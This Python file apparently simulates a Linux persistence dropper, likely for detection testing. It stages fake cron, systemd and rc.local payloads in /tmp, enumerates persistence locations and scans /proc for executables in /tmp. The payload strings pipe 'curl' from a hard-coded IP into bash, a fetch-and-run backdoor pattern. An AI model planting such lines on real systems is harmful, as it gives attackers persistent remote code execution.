from __future__ import annotations

import getpass
import json
import os
import pathlib
import subprocess
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

PROC = "update-manager"

FAKE_CRON = "*/15 * * * * curl -s http://185.220.101.47/update.sh | bash\n"
FAKE_SYSTEMD_UNIT = """\
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl -s http://185.220.101.47/c2 | bash; sleep 300; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
FAKE_RC_LOCAL = "#!/bin/bash\ncurl -s http://185.220.101.47/rc | bash &\n"


def drop_cron_payload() -> None:
    try:
        user = getpass.getuser()
        path = pathlib.Path(f"/tmp/.cron_drop_{user}")
        path.write_text(FAKE_CRON)
        log(PROC, f"Cron payload staged at {path}")
    except Exception:
        pass

    # Read real crontab to understand what's there
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        log(PROC, f"Real crontab has {len(result.stdout.splitlines())} entries")
    except Exception:
        pass


def drop_systemd_unit() -> None:
    path = pathlib.Path("/tmp/.systemd_unit_drop")
    try:
        path.write_text(FAKE_SYSTEMD_UNIT)
        log(PROC, f"Systemd unit staged at {path}")
    except Exception:
        pass


def drop_rc_local() -> None:
    path = pathlib.Path("/tmp/.rc_local_inject")
    try:
        path.write_text(FAKE_RC_LOCAL)
        log(PROC, f"rc.local backdoor staged at {path}")
    except Exception:
        pass


def enumerate_persistence_locations() -> None:
    locations = [
        "/etc/cron.d",
        "/etc/cron.hourly",
        "/etc/cron.daily",
        "/var/spool/cron/crontabs",
        "/etc/systemd/system",
        "/etc/profile.d",
        "/etc/init.d",
        "/etc/rc.local",
        "/etc/ld.so.preload",
    ]
    for loc in locations:
        try:
            p = pathlib.Path(loc)
            if p.is_dir():
                entries = list(p.iterdir())
                log(PROC, f"Persistence location {loc}: {len(entries)} entries")
            elif p.is_file():
                log(PROC, f"Persistence file {loc}: {p.stat().st_size} bytes")
        except Exception:
            pass


def find_tmp_executables() -> None:
    # Check for other /tmp-based processes — simulates awareness of cohabiting malware
    try:
        for pid_dir in pathlib.Path("/proc").iterdir():
            if not pid_dir.name.isdigit():
                continue
            try:
                exe = os.readlink(f"/proc/{pid_dir.name}/exe")
                if "/tmp/" in exe:
                    log(PROC, f"Found /tmp-based process: PID {pid_dir.name} exe={exe}")
            except Exception:
                pass
    except Exception:
        pass


def main() -> None:
    set_proc_name(PROC)
    log(PROC, "Persistence dropper initialized")

    tick = 0
    while True:
        tick += 1

        if tick % 1 == 0:  drop_cron_payload()
        if tick % 2 == 0:  drop_systemd_unit()
        if tick % 3 == 0:  drop_rc_local()
        if tick % 4 == 0:  enumerate_persistence_locations()
        if tick % 5 == 0:  find_tmp_executables()

        time.sleep(jitter(300.0))


main()
